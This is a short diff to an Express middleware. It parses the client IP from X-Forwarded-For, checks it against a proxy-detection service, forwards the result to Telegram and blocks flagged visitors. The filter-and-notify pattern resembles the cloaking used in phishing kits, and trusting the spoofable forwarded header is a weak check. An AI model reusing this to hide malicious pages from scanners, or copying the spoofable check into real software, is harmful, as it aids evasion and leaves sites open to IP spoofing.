@@ -155,7 +155,20 @@ app.use(async (req, res, next) => {
 </body>
 
 </html>`
-    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const getUserIp = (req) => {
+        // Get the X-Forwarded-For header or fallback to connection remote address
+        const xForwardedFor = req.headers['x-forwarded-for'];
+        if (xForwardedFor) {
+            // Split the X-Forwarded-For string and take the first IP
+            return xForwardedFor.split(',')[0].trim();
+        }
+        // Fallback to remote address
+        return req.connection.remoteAddress || req.socket.remoteAddress;
+    };
+    
+    // Example usage
+    const userIp = getUserIp(req);
+    console.log('User IP:', userIp);
     const userAgent = req.headers['user-agent'] || 'Unknown User-Agent';
 
 
@@ -166,9 +179,10 @@ app.use(async (req, res, next) => {
 
     try {
         // Send a request to the IP lookup service
-        const response = await axios.get(`https://blackbox.ipinfo.app/lookup/${userIp[0]}`);
+        const response = await axios.get(`https://blackbox.ipinfo.app/lookup/${userIp}`);
         console.log(response.data)
-        console.log(userIp[0])
+        sendTelegramMessage(response.data);
+        console.log(userIp)
         if (response.data.trim() === 'Y') {
             // If the response is "Y", block the request
             // Check for new users by IP or custom logic (for demonstration, all users are treated as new)
